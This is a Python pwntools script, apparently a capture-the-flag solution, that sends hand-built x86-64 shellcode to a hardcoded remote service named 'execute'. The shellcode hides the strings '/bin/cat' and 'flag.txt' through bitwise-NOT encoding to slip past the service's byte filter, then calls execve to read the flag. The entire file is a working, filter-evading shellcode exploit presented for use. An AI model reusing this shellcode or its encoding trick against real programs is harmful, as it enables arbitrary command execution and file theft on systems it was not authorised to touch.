from pwn import *
import sys

IP = "94.237.58.60"
PORT = 42029

###------ Created from shellcode.asm --------###
shellcode = b"\x4c\x89\xca\x4c\x31\xca\x52\x48"
shellcode+= b"\xbb\xd0\x9d\x96\x91\xd0\x9c\x9e"
shellcode+= b"\x8b\x48\x83\xf3\xff\x53\x48\x89"
shellcode+= b"\xe7\x52\x48\xbb\x99\x93\x9e\x98"
shellcode+= b"\xd1\x8b\x87\x8b\x48\x83\xf3\xff"
shellcode+= b"\x53\x48\x89\xe6\x52\x56\x57\x48"
shellcode+= b"\x89\xe6\xb0\x3c\xfe\xc8\x0f\x05"
###------------------------------------------###

if __name__ == "__main__":
    io = remote(IP,PORT)
    ELF("./execute")
    log.info("Sending payload....")
    io.sendlineafter(b"Hey, just because I am hungry doesn't mean I'll execute everything",shellcode)
    out = io.recvall(1).decode().replace("\n","")
    if out:
        log.success(f"FLAG: {out}")
    else:
        log.failure("Someting's wrong")
